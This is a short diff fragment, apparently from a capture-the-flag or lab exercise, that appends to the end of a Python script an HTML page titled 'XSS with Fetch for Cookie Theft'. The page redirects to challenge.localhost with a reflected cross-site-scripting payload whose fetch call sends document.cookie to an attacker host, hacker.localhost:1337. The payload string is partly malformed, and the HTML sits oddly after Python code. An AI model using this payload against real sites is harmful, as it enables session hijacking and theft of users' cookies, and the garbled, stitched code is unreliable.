@@ -64,3 +64,23 @@ process.wait()
 final_output = process.stdout.read().strip()
 print(final_output)
 
+
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>XSS with Fetch for Cookie Theft</title>
+</head>
+<body>
+    <h1>XSS Attack Simulation</h1>
+
+    <script>
+        window.location.href = "http://challenge.localhost/ephemeral?msg=<script>" +
+        "fetch('http://challenge.localhost/ephemeral?msg=' )" +
+        "fetch('http://hacker.localhost:1337/?cookie=' + document.cookie)" +
+        "</script>";
+    </script>
+</body>
+</html>
